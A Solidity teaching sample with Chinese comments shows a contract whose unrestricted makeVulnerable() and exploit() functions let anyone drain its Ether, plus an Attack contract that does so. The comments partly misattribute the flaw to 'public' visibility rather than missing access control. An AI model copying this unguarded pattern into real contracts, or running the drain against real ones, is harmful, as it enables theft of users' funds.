// Vulnerable contract: Exposed state variable vulnerability demonstrated
// Solidity version pragma
pragma solidity >=0.8.0;

// 此合約存在漏洞：
// 1. 狀態變數 vulnerable 被設為 public，使得外部可以查詢且在某些情況下可能透過其他合約或不當操作修改狀態（例如透過 makeVulnerable() 函式）
// 2. exploit 函式直接根據 vulnerable 狀態執行轉帳操作，攻擊者只要將 vulnerable 設為 true，就能取得合約所有 Ether
contract Stateful {
    // 漏洞重點：公開暴露的狀態變數，可被任意改變
    bool public vulnerable = false;  // 攻擊者可能藉由外部呼叫使此值變成 true

    // 攻擊向量：任何人都可以呼叫此函式來打開漏洞
    function makeVulnerable() public {
        vulnerable = true;
    }

    // 漏洞重點：exploilt() 使用了不受限制的 vulnerable 變數作條件判斷
    function exploit(address payable attacker) public {
        require(vulnerable, "Error: Not vulnerable");
        // 轉移合約中所有 Ether 給攻擊者
        attacker.transfer(address(this).balance);
    }

    // 接收 Ether 的函數 (Solidity >=0.8.0 的版本需使用 receive)
    receive() external payable {}
}

// 最小可行攻擊範例：攻擊合約
// 攻擊者可以透過下列步驟進行攻擊：
// 1. 呼叫 Stateful 合約的 makeVulnerable() 函式，將 vulnerable 狀態設為 true
// 2. 呼叫 exploit() 並傳入攻擊者自己的位址，即可提取合約中所有 Ether
contract Attack {
    Stateful public vulnerableContract;

    // 部署時傳入目標漏洞合約的地址，並可同時轉入 Ether
    constructor(Stateful _vulnerableContract) payable {
        vulnerableContract = _vulnerableContract;
    }

    // 執行攻擊
    function attack() public {
        // 第一步：開啟漏洞
        vulnerableContract.makeVulnerable();
        // 第二步：執行 exploit 轉移該合約所有 Ether 到攻擊者地址
        vulnerableContract.exploit(payable(msg.sender));
    }

    // 接收 Ether
    receive() external payable {}
}
